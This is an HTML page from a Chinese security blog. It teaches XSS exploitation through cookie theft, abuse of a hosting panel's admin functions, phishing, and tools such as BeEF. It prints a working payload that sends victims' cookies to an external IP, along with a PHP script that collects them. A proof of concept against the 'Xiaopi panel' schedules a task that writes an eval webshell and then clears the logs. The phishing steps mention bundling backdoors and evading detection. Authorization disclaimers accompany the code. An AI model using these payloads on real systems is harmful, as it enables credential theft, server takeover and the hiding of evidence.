@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@XSS 攻击利用示例：凭据盗取、数据提交（业务滥用）、网络钓鱼与溯源综合工具。含 PoC 代码片段与搭建参考。">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="https://hzhsec.github.io/list/base_bug/xss/xss3/">
+
+    <link rel="alternate" type="application/rss+xml" href="https://hzhsec.github.io//index.xml" title="Hzhsec home">
+
+    
+
+
+<script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>
+
+    <meta property="og:title" content="XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合" />
+<meta property="og:description" content="XSS 攻击利用示例：凭据盗取、数据提交（业务滥用）、网络钓鱼与溯源综合工具。含 PoC 代码片段与搭建参考。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hzhsec.github.io/list/base_bug/xss/xss3/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-10-16T16:30:00+08:00" />
+<meta property="article:modified_time" content="2025-10-16T16:30:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合"/>
+<meta name="twitter:description" content="XSS 攻击利用示例：凭据盗取、数据提交（业务滥用）、网络钓鱼与溯源综合工具。含 PoC 代码片段与搭建参考。"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "https://hzhsec.github.io/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "https://hzhsec.github.io/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "XSS漏洞",
+      "item": "https://hzhsec.github.io/list/base_bug/xss/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合",
+      "item": "https://hzhsec.github.io/list/base_bug/xss/xss3/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合",
+  "name": "XSS 跨站 — 攻击利用：凭据盗取 \/ 数据提交 \/ 网络钓鱼 \/ 溯源综合",
+  "description": "XSS 攻击利用示例：凭据盗取、数据提交（业务滥用）、网络钓鱼与溯源综合工具。含 PoC 代码片段与搭建参考。",
+  "keywords": [
+    "XSS", "凭据盗取", "网络钓鱼", "数据提交", "溯源", "BeEF", "XSSReceiver"
+  ],
+  "articleBody": "XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合 漏洞原理：接受输入数据，输出显示数据后解析执行。\n基础类型：反射(非持续)、存储(持续)、DOM-BASE。\n拓展类型：jquery、mxss、uxss、pdfxss、flashxss、上传xss 等。\n常用资料：https://www.freebuf.com/articles/web/340080.html\n攻击利用：盲打、COOKIE 盗取、凭据窃取、页面劫持、网络钓鱼、权限维持等。\n安全修复：字符过滤、上下文编码、HttpOnly、CSP、防护规则（WAF）等。\n测试流程：先定位输出点 → 决定注入位置 → 注入并观察执行（逐步升级 payload）。\nXSS 跨站 — 攻击利用：凭据盗取 前提条件：目标站点未对关键 Cookie 使用 HttpOnly，或存在其他可读凭据的回显点。\n利用思路：通过 XSS 将受害者的 cookie / 会话凭据发回攻击者控制的服务器。\n触发示例（前端 payload）：\n\u003cscript\u003e var url='http://47.94.236.117/getcookie.php?u='+encodeURIComponent(window.location.href)+'\u0026c='+encodeURIComponent(document.cookie); document.write(\"\"); \u003c/script\u003e 后端接收示例（PHP）：\n\u003c?php $url = $_GET['u']; $cookie = $_GET['c']; $fp = fopen('cookie.txt', \"a\"); fwrite($fp, $url . \"|\" . $cookie . \"\\n\"); fclose($fp); ?\u003e 建议：实际测试时请对敏感数据进行妥善保管，并在授权范围内进行。若 Cookie 设置了 HttpOnly，JS 无法直接读取，这也是首要防护手段之一。\nXSS 跨站 — 攻击利用：数据提交（业务滥用） 思路：当无法直接窃取凭据或凭据受保护时，可以利用受害者已有权限在后台执行业务操作（例如任务管理、日志清理、文件写入等），以间接植入后门或持久化载荷。\n示例场景：利用某面板（示例中为“小皮面板”）的日志 XSS 漏洞，利用 JS 发起对任务管理的请求，创建一个包含反弹 webshell 的计划任务并执行，从而在服务器上写入恶意文件。\n示例 PoC（注：仅作技术演示，务必在授权范围内测试）\n\u003cscript src=\"http://xx.xxx.xxx/poc.js\"\u003e\u003c/script\u003e function poc(){ $.get('/service/app/tasks.php?type=task_list', {}, function(data){ var id = data.data[0].ID; $.post('/service/app/tasks.php?type=exec_task', { tid: id }, function(res2){ $.post('/service/app/log.php?type=clearlog', {}, function(res3){}, \"json\"); }, \"json\"); }, \"json\"); } function save(){ var data = {}; data.task_id = \"\"; data.title = \"test\"; data.exec_cycle = \"1\"; data.week = \"1\"; data.day = \"3\"; data.hour = \"14\"; data.minute = \"20\"; data.shell = 'echo \"\u003c?php @eval($_POST[123]);?\u003e\" \u003eC:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php'; $.post('/service/app/tasks.php?type=save_shell', data, function(res){ poc(); }, 'json'); } save(); 注意：此类利用属于对业务逻辑的滥用，可能对系统造成严重影响。测试前需获得明确授权并限定时间窗口。\nXSS 跨站 — 攻击利用：网络钓鱼 流程：\n部署可访问的钓鱼页面并准备伪装界面； 在目标站点植入 XSS payload，等待受害者访问并被注入钓鱼页面或重定向到钓鱼页面； 将后门/正常文件捆绑并尝试规避检测（技术与法律风险高）。 参考项目：Fake-flash（示例仓库，用于钓鱼页面构建、界面伪装等）\nhttps://github.com/r00tSe7en/Fake-flash.cn\nXSS 跨站 — 攻击利用：溯源与综合工具 XSSReceiver（XSS 数据接收平台）：简单搭建即可接收 XSS 回传数据，无需数据库或复杂环境。\n项目与搭建参考： https://github.com/epoch99/BlueLotus_XSSReceiver-master\nBeEF（Browser Exploitation Framework）— 浏览器控制框架：通过注入钩子 JS（BeEF hook），可在被控制浏览器上执行各种模块化操作（如指纹采集、命令执行、钓鱼模块等）。\n快速搭建（Docker 示例）：\ndocker run --rm -p 3000:3000 janes/beef 这些工具均为渗透测试与漏洞复现提供便利，请确保在授权范围与合规前提下使用，严禁用于未授权的攻击。\n合规与安全提醒 在进行 XSS 利用测试前，务必持有明确的书面授权与测试范围； 记录测试步骤、时间窗口、产出文件（日志/截图/复现步骤）以便事后审计； 优先在隔离或测试环境复现复核，避免对生产系统产生不可逆影响； 发现高危问题（如能导致凭据盗取或远程代码执行）应立即按流程上报并协助修复。 参考项目与延伸阅读 XSSReceiver: https://github.com/epoch99/BlueLotus_XSSReceiver-master BeEF (Browser Exploitation Framework): https://github.com/beefproject/beef Fake-flash.cn (示例钓鱼页面仓库): https://github.com/r00tSe7en/Fake-flash.cn ",
+  "wordCount" : "211",
+  "inLanguage": "en",
+  "datePublished": "2025-10-16T16:30:00+08:00",
+  "dateModified": "2025-10-16T16:30:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hzhsec.github.io/list/base_bug/xss/xss3/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hzhsec.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合</h1>
+  </header>
+
+  <p>
+  <small>
+    October 16, 2025&nbsp;· 211 words&nbsp;· One minute</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#xss-跨站--攻击利用凭据盗取">XSS 跨站 — 攻击利用：凭据盗取</a></li>
+    <li><a href="#xss-跨站--攻击利用数据提交业务滥用">XSS 跨站 — 攻击利用：数据提交（业务滥用）</a></li>
+    <li><a href="#xss-跨站--攻击利用网络钓鱼">XSS 跨站 — 攻击利用：网络钓鱼</a></li>
+    <li><a href="#xss-跨站--攻击利用溯源与综合工具">XSS 跨站 — 攻击利用：溯源与综合工具</a></li>
+    <li><a href="#合规与安全提醒">合规与安全提醒</a></li>
+    <li><a href="#参考项目与延伸阅读">参考项目与延伸阅读</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h1 id="xss-跨站--攻击利用凭据盗取--数据提交--网络钓鱼--溯源综合">XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合</h1>
+<p><strong>漏洞原理</strong>：接受输入数据，输出显示数据后解析执行。</p>
+<p><strong>基础类型</strong>：反射(非持续)、存储(持续)、DOM-BASE。</p>
+<p><strong>拓展类型</strong>：jquery、mxss、uxss、pdfxss、flashxss、上传xss 等。</p>
+<p><strong>常用资料</strong>：https://www.freebuf.com/articles/web/340080.html</p>
+<p><strong>攻击利用</strong>：盲打、COOKIE 盗取、凭据窃取、页面劫持、网络钓鱼、权限维持等。</p>
+<p><strong>安全修复</strong>：字符过滤、上下文编码、HttpOnly、CSP、防护规则（WAF）等。</p>
+<p><strong>测试流程</strong>：先定位输出点 → 决定注入位置 → 注入并观察执行（逐步升级 payload）。</p>
+<hr>
+<h2 id="xss-跨站--攻击利用凭据盗取">XSS 跨站 — 攻击利用：凭据盗取</h2>
+<p><strong>前提条件</strong>：目标站点未对关键 Cookie 使用 HttpOnly，或存在其他可读凭据的回显点。</p>
+<p><strong>利用思路</strong>：通过 XSS 将受害者的 cookie / 会话凭据发回攻击者控制的服务器。</p>
+<p><strong>触发示例（前端 payload）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://47.94.236.117/getcookie.php?u=&#39;</span><span style="color:#f92672">+</span>encodeURIComponent(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&amp;c=&#39;</span><span style="color:#f92672">+</span>encodeURIComponent(document.<span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;&lt;img src=&#39;&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">url</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39; /&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>后端接收示例（PHP）</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;u&#39;</span>];
+</span></span><span style="display:flex;"><span>$cookie <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+</span></span><span style="display:flex;"><span>$fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;cookie.txt&#39;</span>, <span style="color:#e6db74">&#34;a&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>($fp, $url <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;|&#34;</span> <span style="color:#f92672">.</span> $cookie <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($fp);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><blockquote>
+<p>建议：实际测试时请对敏感数据进行妥善保管，并在授权范围内进行。若 Cookie 设置了 <code>HttpOnly</code>，JS 无法直接读取，这也是首要防护手段之一。</p>
+</blockquote>
+<hr>
+<h2 id="xss-跨站--攻击利用数据提交业务滥用">XSS 跨站 — 攻击利用：数据提交（业务滥用）</h2>
+<p><strong>思路</strong>：当无法直接窃取凭据或凭据受保护时，可以利用受害者已有权限在后台执行业务操作（例如任务管理、日志清理、文件写入等），以间接植入后门或持久化载荷。</p>
+<p><strong>示例场景</strong>：利用某面板（示例中为“小皮面板”）的日志 XSS 漏洞，利用 JS 发起对任务管理的请求，创建一个包含反弹 webshell 的计划任务并执行，从而在服务器上写入恶意文件。</p>
+<p><strong>示例 PoC（注：仅作技术演示，务必在授权范围内测试）</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://xx.xxx.xxx/poc.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>function poc(){
+</span></span><span style="display:flex;"><span>  $.get(&#39;/service/app/tasks.php?type=task_list&#39;, {}, function(data){
+</span></span><span style="display:flex;"><span>    var id = data.data[0].ID;
+</span></span><span style="display:flex;"><span>    $.post(&#39;/service/app/tasks.php?type=exec_task&#39;, { tid: id }, function(res2){
+</span></span><span style="display:flex;"><span>      $.post(&#39;/service/app/log.php?type=clearlog&#39;, {}, function(res3){}, &#34;json&#34;);
+</span></span><span style="display:flex;"><span>    }, &#34;json&#34;);
+</span></span><span style="display:flex;"><span>  }, &#34;json&#34;);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>function save(){
+</span></span><span style="display:flex;"><span>  var data = {};
+</span></span><span style="display:flex;"><span>  data.task_id = &#34;&#34;;
+</span></span><span style="display:flex;"><span>  data.title = &#34;test&#34;;
+</span></span><span style="display:flex;"><span>  data.exec_cycle = &#34;1&#34;;
+</span></span><span style="display:flex;"><span>  data.week = &#34;1&#34;;
+</span></span><span style="display:flex;"><span>  data.day = &#34;3&#34;;
+</span></span><span style="display:flex;"><span>  data.hour = &#34;14&#34;;
+</span></span><span style="display:flex;"><span>  data.minute = &#34;20&#34;;
+</span></span><span style="display:flex;"><span>  data.shell = &#39;echo &#34;<span style="color:#75715e">&lt;?php @eval($_POST[123]);?&gt;</span>&#34; &gt;C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php&#39;;
+</span></span><span style="display:flex;"><span>  $.post(&#39;/service/app/tasks.php?type=save_shell&#39;, data, function(res){
+</span></span><span style="display:flex;"><span>    poc();
+</span></span><span style="display:flex;"><span>  }, &#39;json&#39;);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>save();
+</span></span></code></pre></div><p><strong>注意</strong>：此类利用属于对业务逻辑的滥用，可能对系统造成严重影响。测试前需获得明确授权并限定时间窗口。</p>
+<hr>
+<h2 id="xss-跨站--攻击利用网络钓鱼">XSS 跨站 — 攻击利用：网络钓鱼</h2>
+<p><strong>流程</strong>：</p>
+<ol>
+<li>部署可访问的钓鱼页面并准备伪装界面；</li>
+<li>在目标站点植入 XSS payload，等待受害者访问并被注入钓鱼页面或重定向到钓鱼页面；</li>
+<li>将后门/正常文件捆绑并尝试规避检测（技术与法律风险高）。</li>
+</ol>
+<p><strong>参考项目</strong>：Fake-flash（示例仓库，用于钓鱼页面构建、界面伪装等）<br>
+<a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></p>
+<hr>
+<h2 id="xss-跨站--攻击利用溯源与综合工具">XSS 跨站 — 攻击利用：溯源与综合工具</h2>
+<ul>
+<li>
+<p><strong>XSSReceiver（XSS 数据接收平台）</strong>：简单搭建即可接收 XSS 回传数据，无需数据库或复杂环境。<br>
+项目与搭建参考： <a href="https://github.com/epoch99/BlueLotus_XSSReceiver-master">https://github.com/epoch99/BlueLotus_XSSReceiver-master</a></p>
+</li>
+<li>
+<p><strong>BeEF（Browser Exploitation Framework）— 浏览器控制框架</strong>：通过注入钩子 JS（BeEF hook），可在被控制浏览器上执行各种模块化操作（如指纹采集、命令执行、钓鱼模块等）。<br>
+快速搭建（Docker 示例）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run --rm -p 3000:3000 janes/beef
+</span></span></code></pre></div></li>
+</ul>
+<blockquote>
+<p>这些工具均为渗透测试与漏洞复现提供便利，请确保在授权范围与合规前提下使用，严禁用于未授权的攻击。</p>
+</blockquote>
+<hr>
+<h2 id="合规与安全提醒">合规与安全提醒</h2>
+<ul>
+<li>在进行 XSS 利用测试前，务必持有明确的书面授权与测试范围；</li>
+<li>记录测试步骤、时间窗口、产出文件（日志/截图/复现步骤）以便事后审计；</li>
+<li>优先在隔离或测试环境复现复核，避免对生产系统产生不可逆影响；</li>
+<li>发现高危问题（如能导致凭据盗取或远程代码执行）应立即按流程上报并协助修复。</li>
+</ul>
+<hr>
+<h2 id="参考项目与延伸阅读">参考项目与延伸阅读</h2>
+<ul>
+<li>XSSReceiver: <a href="https://github.com/epoch99/BlueLotus_XSSReceiver-master">https://github.com/epoch99/BlueLotus_XSSReceiver-master</a></li>
+<li>BeEF (Browser Exploitation Framework): <a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></li>
+<li>Fake-flash.cn (示例钓鱼页面仓库): <a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></li>
+</ul>
+<hr></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="https://hzhsec.github.io/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql2/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>MySQL：数据请求类型与注入面分析</span></a>
+    
+    
+    <a class="next" href="https://hzhsec.github.io/list/app/app3/"><span>APK 逆向：数据/逻辑/视图 修改实战</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="https://hzhsec.github.io/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
